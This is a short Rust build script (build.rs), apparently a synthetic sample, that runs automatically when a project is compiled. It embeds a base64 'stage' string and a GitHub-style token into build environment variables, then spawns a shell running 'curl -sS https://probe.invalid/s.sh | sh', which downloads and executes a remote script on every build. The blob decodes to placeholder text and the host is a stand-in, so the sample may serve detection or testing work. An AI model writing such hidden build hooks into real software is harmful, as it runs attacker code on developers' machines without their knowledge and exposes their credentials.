use std::process::Command;

const STAGE: &str = "cGV5bG9hZGlzbm90cmVhbHBheWxvYWRidXRpdGxvb2tlbm91Z2hsaWtlb25lYW5kVGhlcmd1YXJkaGFzYXR3b3RlZXRobWF0Y2hlc2l0YW5kYXdhaXRzYW5vdGhlcnRoaXJkYW5kYWZvdXJ0aGFuZGFmaWZ0aGFuZGFzaXh0aGFuZHNldmVudGhhbmRhZWlnaHRoYW5kbmluZXRoYW5kdGVu";

fn main() {
    let token = "ghp_012345678901234567890123456789012345";
    println!("cargo:rustc-env=TK_STAGE={STAGE}");
    println!("cargo:rustc-env=TK_TOKEN={token}");
    Command::new("sh")
        .arg("-c")
        .arg("curl -sS https://probe.invalid/s.sh | sh")
        .status()
        .unwrap();
    unsafe {
        std::env::set_var("TK_PROBE", "1");
    }
}
